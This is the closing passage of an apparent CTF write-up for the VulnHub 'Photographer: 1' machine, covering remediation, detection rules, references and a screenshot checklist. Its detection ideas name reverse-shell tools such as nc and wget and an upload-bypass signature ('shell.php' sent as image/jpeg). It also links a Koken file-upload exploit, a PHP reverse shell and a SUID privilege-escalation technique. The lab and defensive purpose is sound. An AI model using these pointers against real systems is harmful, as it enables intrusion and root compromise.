9. **Retire EOL systems.** Ubuntu 16.04 ended standard security support in April 2021.
   Koken CMS itself was **discontinued by its vendor in 2021** — there will never be a
   patch. Migrate off it.
10. **Detection opportunities.**
    - WAF/log alert on multipart uploads whose `Content-Disposition filename` differs
      from the `Content-Type` (here: `filename="shell.php"` with
      `Content-Type: image/jpeg`). That mismatch is a near-perfect upload-bypass
      signature.
    - Alert on file *creation* with a `.php` extension under a media/storage
      directory — auditd `-w /var/www/html/koken/storage -p wa -k upload_write`.
    - Alert on `apache2`/`php-fpm` spawning `sh`, `bash`, `python`, `nc` or `wget`
      (process-lineage monitoring: Sysmon for Linux, Wazuh, auditd `execve` rules).
    - Alert on `setuid(0)` transitions where the parent is a web-server process — the
      `pcntl_exec` escalation is visible as an `euid` change in audit logs.
    - Alert on SMB `guest`/`anonymous` session logons: `grep -i 'anonymous\|guest' /var/log/samba/log.*`.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/photographer-1,519/>
- Author: Vinícius Vieira — <http://v1n1v131r4.com>, `@v1n1v131r4`
- Community writeups consulted:
  - [chicxulub — Photographer: 1 Walkthrough — Vulnhub](https://medium.com/@chicxulub/photographer-1-walkthrough-vulnhub-f3a1426fe4ed)
  - [Abhijith Kumar — Vulnhub Walkthrough Photographer: 1](https://medium.com/@abhijithkumar2000/vulnhub-walkthrough-photographer-1-300bd0a4d90c)
  - [DatBoyBlu3 — Vulnhub: Photographer 1](https://medium.com/@DatBoyBlu3/vulnhub-photographer-1-63a991c0cae)
  - [shubham-singh — Photographer: 1 Vulnhub walkthrough](https://shubham-singh.medium.com/photographer-1-vulnhub-walkthrough-e7c1f3a5dde7)
  - [cyberarri — Photographer: 1 Writeup](https://cyberarri.com/2022-08-07/photographer-1-writeup/)
  - [cyberdai — Photography VulnHUB Walkthrough](https://cyberdai.org/posts/vulnhub/vulnhub-photography/)
  - [vshaliii — Photographer1-Vulnhub-Walkthrough (GitHub)](https://github.com/vshaliii/Photographer1-Vulnhub-Walkthrough)
  - [InfoSec Institute — Photographer 1: CTF walkthrough](https://resources.infosecinstitute.com/topic/photographer-1-ctf-walkthrough-part-1/)
- Exploits / background:
  - [Exploit-DB 48706 — Koken CMS 0.22.24 Arbitrary File Upload](https://www.exploit-db.com/exploits/48706)
  - [Koken CMS (discontinued) — <https://koken.me>](https://koken.me/)
  - [GTFOBins — php (SUID)](https://gtfobins.github.io/gtfobins/php/#suid)
  - [`pcntl_exec` — PHP manual](https://www.php.net/manual/en/function.pcntl-exec.php)
  - [`bash(1)` — the `-p` privileged mode flag](https://man7.org/linux/man-pages/man1/bash.1.html)
  - [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
  - [`smbmap`](https://github.com/ShawnDEvans/smbmap) · [`enum4linux`](https://github.com/CiscoCXSecurity/enum4linux) · [`smbclient(1)`](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
  - [Burp Suite — Intercept and Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy)
  - [pentestmonkey — PHP reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

---

## 8. Screenshot checklist

- [ ] `images/01-nmap.png` — ports 80/139/445/8000 and the `Koken 0.22.24` generator header
- [ ] `images/02-smb.png` — `smbmap` share permissions and `mailsent.txt`
- [ ] `images/03-burp.png` — the intercepted multipart request with `.jpg` stripped
- [ ] `images/04-shell.png` — reverse shell as `www-data`
- [ ] `images/05-privesc.png` — SUID `php7.2` and `euid=0(root)`
- [ ] `images/06-root-flag.png` — `/root/proof.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
